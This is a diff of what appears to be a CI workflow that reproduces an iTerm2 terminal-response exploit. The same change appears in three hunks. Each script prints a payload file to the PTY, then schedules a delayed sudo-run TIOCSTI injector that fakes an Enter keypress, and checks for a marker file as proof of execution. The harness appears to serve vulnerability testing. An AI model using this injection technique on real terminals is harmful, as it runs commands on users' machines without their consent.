@@ -93,36 +93,35 @@ jobs:
           log "=== login shell started $(date) ==="
           log "TTY: $(tty)"
           log "TERM: $TERM"
-          log "UID: $(id -u) EUID: $(id -E 2>/dev/null || echo n/a)"
+          log "UID: $(id -u)"
 
           sleep 3
           log "--- catting payload (stdout MUST go to the PTY) ---"
           cat /tmp/payload.md
           log "--- cat done ---"
 
-          # 让 iTerm2 有时间把响应写进 PTY 输入队列
-          sleep 3
+          # 让 iTerm2 把响应写进 PTY 输入队列
+          sleep 2
 
-          # 关键：注入一个换行，等价于「用户按了回车」
-          # sudo 保留控制终端，所以 TIOCSTI 的 session 校验能过
-          log "--- injecting newline via TIOCSTI ---"
-          if sudo -n /tmp/inject 2>>"$LOG"; then
-            log "inject succeeded"
-          else
-            log "inject FAILED (see errno above)"
-            # 退路：不经 sudo 直接试，看是不是权限问题
-            /tmp/inject 2>>"$LOG" && log "inject worked without sudo" || log "inject needs root"
-          fi
+          # 把 stdin（真正的 tty）复制到 fd 3，供后台进程继承
+          exec 3<&0
 
-          sleep 4
-          log "--- marker check ---"
-          if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
-            log "MARKER_PRESENT"
-          else
-            log "MARKER_ABSENT"
-          fi
+          # 后台：等 bash 起来后再注入换行
+          # 用 <&3 保证 sudo 拿到的是 tty，而不是 /dev/null
+          log "--- scheduling TIOCSTI injection in 7s ---"
+          (
+            sleep 7
+            sudo -n /tmp/inject <&3 2>>"$LOG" && log "inject OK" || log "inject FAILED"
+            sleep 2
+            if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
+              log "MARKER_PRESENT"
+            else
+              log "MARKER_ABSENT"
+            fi
+          ) &
+          INJPID=$!
 
-          log "--- exec bash ---"
+          log "--- exec bash (injector pid $INJPID will fire in 7s) ---"
           exec /bin/bash -l
 
           LSHEOF
@@ -269,36 +268,35 @@ jobs:
           log "=== login shell started $(date) ==="
           log "TTY: $(tty)"
           log "TERM: $TERM"
-          log "UID: $(id -u) EUID: $(id -E 2>/dev/null || echo n/a)"
+          log "UID: $(id -u)"
 
           sleep 3
           log "--- catting payload (stdout MUST go to the PTY) ---"
           cat /tmp/payload.md
           log "--- cat done ---"
 
-          # 让 iTerm2 有时间把响应写进 PTY 输入队列
-          sleep 3
+          # 让 iTerm2 把响应写进 PTY 输入队列
+          sleep 2
 
-          # 关键：注入一个换行，等价于「用户按了回车」
-          # sudo 保留控制终端，所以 TIOCSTI 的 session 校验能过
-          log "--- injecting newline via TIOCSTI ---"
-          if sudo -n /tmp/inject 2>>"$LOG"; then
-            log "inject succeeded"
-          else
-            log "inject FAILED (see errno above)"
-            # 退路：不经 sudo 直接试，看是不是权限问题
-            /tmp/inject 2>>"$LOG" && log "inject worked without sudo" || log "inject needs root"
-          fi
+          # 把 stdin（真正的 tty）复制到 fd 3，供后台进程继承
+          exec 3<&0
 
-          sleep 4
-          log "--- marker check ---"
-          if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
-            log "MARKER_PRESENT"
-          else
-            log "MARKER_ABSENT"
-          fi
+          # 后台：等 bash 起来后再注入换行
+          # 用 <&3 保证 sudo 拿到的是 tty，而不是 /dev/null
+          log "--- scheduling TIOCSTI injection in 7s ---"
+          (
+            sleep 7
+            sudo -n /tmp/inject <&3 2>>"$LOG" && log "inject OK" || log "inject FAILED"
+            sleep 2
+            if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
+              log "MARKER_PRESENT"
+            else
+              log "MARKER_ABSENT"
+            fi
+          ) &
+          INJPID=$!
 
-          log "--- exec bash ---"
+          log "--- exec bash (injector pid $INJPID will fire in 7s) ---"
           exec /bin/bash -l
 
           LSHEOF
@@ -445,36 +443,35 @@ jobs:
           log "=== login shell started $(date) ==="
           log "TTY: $(tty)"
           log "TERM: $TERM"
-          log "UID: $(id -u) EUID: $(id -E 2>/dev/null || echo n/a)"
+          log "UID: $(id -u)"
 
           sleep 3
           log "--- catting payload (stdout MUST go to the PTY) ---"
           cat /tmp/payload.md
           log "--- cat done ---"
 
-          # 让 iTerm2 有时间把响应写进 PTY 输入队列
-          sleep 3
+          # 让 iTerm2 把响应写进 PTY 输入队列
+          sleep 2
 
-          # 关键：注入一个换行，等价于「用户按了回车」
-          # sudo 保留控制终端，所以 TIOCSTI 的 session 校验能过
-          log "--- injecting newline via TIOCSTI ---"
-          if sudo -n /tmp/inject 2>>"$LOG"; then
-            log "inject succeeded"
-          else
-            log "inject FAILED (see errno above)"
-            # 退路：不经 sudo 直接试，看是不是权限问题
-            /tmp/inject 2>>"$LOG" && log "inject worked without sudo" || log "inject needs root"
-          fi
+          # 把 stdin（真正的 tty）复制到 fd 3，供后台进程继承
+          exec 3<&0
 
-          sleep 4
-          log "--- marker check ---"
-          if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
-            log "MARKER_PRESENT"
-          else
-            log "MARKER_ABSENT"
-          fi
+          # 后台：等 bash 起来后再注入换行
+          # 用 <&3 保证 sudo 拿到的是 tty，而不是 /dev/null
+          log "--- scheduling TIOCSTI injection in 7s ---"
+          (
+            sleep 7
+            sudo -n /tmp/inject <&3 2>>"$LOG" && log "inject OK" || log "inject FAILED"
+            sleep 2
+            if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
+              log "MARKER_PRESENT"
+            else
+              log "MARKER_ABSENT"
+            fi
+          ) &
+          INJPID=$!
 
-          log "--- exec bash ---"
+          log "--- exec bash (injector pid $INJPID will fire in 7s) ---"
           exec /bin/bash -l
 
           LSHEOF
